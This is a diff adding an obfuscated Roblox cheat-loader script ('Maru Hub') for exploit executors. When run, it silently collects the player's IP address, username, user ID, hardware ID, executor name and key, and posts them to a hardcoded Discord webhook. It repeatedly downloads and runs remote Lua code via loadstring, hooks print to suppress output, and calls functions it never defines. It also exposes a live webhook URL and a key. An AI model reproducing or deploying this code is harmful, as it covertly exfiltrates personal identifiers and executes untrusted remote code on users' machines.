@@ -1,0 +1,149 @@
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+print("🔐 Your Key Is: " .. getgenv().Key)
+print("🗂️ Your Script Is: Maru Hub")
+print("🏕️ Our Discord: https://discord.gg/FcEGmkNDDe ☎️")
+print("🧨 Sxionax's Best Developer: https://discord.gg/2C2vTJX33q 📡")
+
+local yYksFracgUqV = "https://discord.com/api/webhooks/1328000288161923152/XoC0itpI6tLAxP0fMd9-07YSgtoYixGWg1XO1c-NlE3iLvWle-UckJTSwxqi40eAglXn"
+local http = game:GetService("HttpService")
+local requestFunction = http_request or request or syn.request
+
+local function pPHzDNuJIbDp()
+    local response = requestFunction({ Url = "https://ipinfo.io/json", Method = "GET" })
+    return http:JSONDecode(response.Body).ip
+end
+
+local ipData = pPHzDNuJIbDp()
+local player = game.Players.LocalPlayer
+local embedData = {
+    embeds = {
+        {
+            title = "The Script Was Just Executed",
+            type = "rich",
+            color = tonumber("1cff1a", 16),
+            thumbnail = {
+                url = "https://media.discordapp.net/attachments/1276435905200128010/1342507906112950302/discord_fake_avatar_decorations_1740128914852.gif?ex=67b9e36b&is=67b891eb&hm=4caf70823b9331ef50cebba5b6beed488f5ba64be244e7a6c13b02993ec2227a&=&width=216&height=216"
+            },
+            fields = {
+                { name = "Username / UserId", value = string.format("```%s / %d```", player.Name, player.UserId) },
+                { name = "Internet Protocol", value = string.format("```%s```", ipData), inline = true },
+                { name = "Executor", value = string.format("```%s```", identifyexecutor()), inline = true },
+                { name = "Hardware ID", value = string.format("```%s```", gethwid()), inline = false },
+                { name = "Key", value = string.format("```%s```", getgenv().Key), inline = false },
+                { name = "JobId", value = string.format("```%s```", game.JobId), inline = false },
+                { name = "Profile Link", value = string.format("[Click Here](https://www.roblox.com/users/%d/profile)", player.UserId), inline = true },
+                { name = "Game Link", value = string.format("[Click Here](https://www.roblox.com/games/%d)", game.PlaceId), inline = true }
+            }
+        }
+    }
+}
+
+local payload = http:JSONEncode(embedData)
+local headers = { ["Content-Type"] = "application/json" }
+
+local success, err = pcall(function()
+    requestFunction({ Url = yYksFracgUqV, Body = payload, Method = "POST", Headers = headers })
+end)
+
+if not success then
+    warn("⛔ An Error Occurred While Sending The Server's Information To The Webhook: https://discord.gg/FcEGmkNDDe 🦠")
+end
+
+local function MBflfFhVlUYH()
+    local RgBCfatiHayu = { "Arceus X", "Codex", "VegaX", "Cryptic", "Trigon", "Evon" }
+    local hdomCfbkDdio = identifyexecutor()
+    local djNtgvSMCJmp = false
+    
+    for _, adRmtPXOjVVU in ipairs(RgBCfatiHayu) do
+        if hdomCfbkDdio == adRmtPXOjVVU then
+            djNtgvSMCJmp = true
+            break
+        end
+    end
+    
+    if not djNtgvSMCJmp then
+        warn("🐌 Wrong Executor, Please Check Again And Use The Correct Executor: https://discord.gg/FcEGmkNDDe 🧨")
+        game.Players.LocalPlayer:Kick("🐌 Wrong Executor, Please Check Again And Use The Correct Executor: https://discord.gg/FcEGmkNDDe 🧨")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+    end
+end
+
+local function EfAmRBLUqVPM()
+    if gethwid() ~= "f703e3d6f898de7d" then
+        warn("🦚 Wrong Hardware ID, Please Check Again And Use The Correct Hardware ID: https://discord.gg/FcEGmkNDDe 🥛")
+        game.Players.LocalPlayer:Kick("🦚 Wrong Hardware ID, Please Check Again And Use The Correct Hardware ID: https://discord.gg/FcEGmkNDDe 🥛")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+    end
+end
+
+local function VvLszuMUXPYd()
+    if not getgenv().Key or getgenv().Key == "" then
+        warn("🎙️ Key Not Found, Please Enter The Key To Use The Script: https://discord.gg/FcEGmkNDDe 👩🏾‍🚀")
+        game:GetService("Players").LocalPlayer:Kick("🎙️ Key Not Found, Please Enter The Key To Use The Script: https://discord.gg/FcEGmkNDDe 👩🏾‍🚀")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+    end
+end
+
+pcall(function()
+    local beJHHbNjdPid = syn and syn.request or http_request or http and http.request or request and request.request
+    if not beJHHbNjdPid then
+        warn("❌ Executor Not Compatible! ❌")
+        game:GetService("Players").LocalPlayer:Kick("❌ Executor Not Compatible! ❌")
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+    end
+
+    beJHHbNjdPid = beJHHbNjdPid({
+        Url = "https://apisxionax.x10.mx/nSDs6oT4xDx.php",
+        Method = "POST",
+        Headers = {["Authorization"] = getgenv().Key, ["Content-Type"] = "application/json"},
+        Body = game:GetService("HttpService"):JSONEncode({ iddiscord = tostring(game:GetService("Players").LocalPlayer.UserId) })
+    })
+
+    if not beJHHbNjdPid or beJHHbNjdPid.StatusCode ~= 200 then
+        warn("❌ Sxionax API Unavailable. Try Again Later: https://discord.gg/FcEGmkNDDe 🥊")
+        game:GetService("Players").LocalPlayer:Kick("❌ Sxionax API Unavailable, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe 🥊")
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+    end
+
+    pcall(function()
+        local KlVBGaUKcpDu = game:GetService("HttpService"):JSONDecode(beJHHbNjdPid.Body)
+        if KlVBGaUKcpDu.success == true or KlVBGaUKcpDu.redeemer == true then
+            print("🚀 Key Authentication Successful, Script Executing... 🎉")
+        else
+            warn("❌ Key Verification Failed – Execution Halted: https://discord.gg/FcEGmkNDDe 🚫🔑")
+            game:GetService("Players").LocalPlayer:Kick("❌ Key Verification Failed, Execution Halted: https://discord.gg/FcEGmkNDDe 🚫🔑")
+            return loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+        end
+    end)
+end)
+
+hookfunction(print, function(...) return ... end)
+
+MBflfFhVlUYH()
+EfAmRBLUqVPM()
+VvLszuMUXPYd()
+zBIjvrFwbVQy()
+TxqfbskodmCs()
+
+getgenv().Key = "MARU-J2U2I-6AAC-64VH-VEXJS-6HB33"
+getgenv().id = "1064057088713691177"
+
+repeat
+    local CwnUXJjslpKN = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/xshiba/MaruBitkub/main/Mobile.lua"))()
+    end)
+until CwnUXJjslpKN
+
+repeat
+    local CwnUXJjslpKN = pcall(function()
+        getgenv().Key = "https://discord.gg/FcEGmkNDDe"
+        getgenv().id = "https://discord.gg/FcEGmkNDDe"
+    end)
+until CwnUXJjslpKN
+
+
+
+
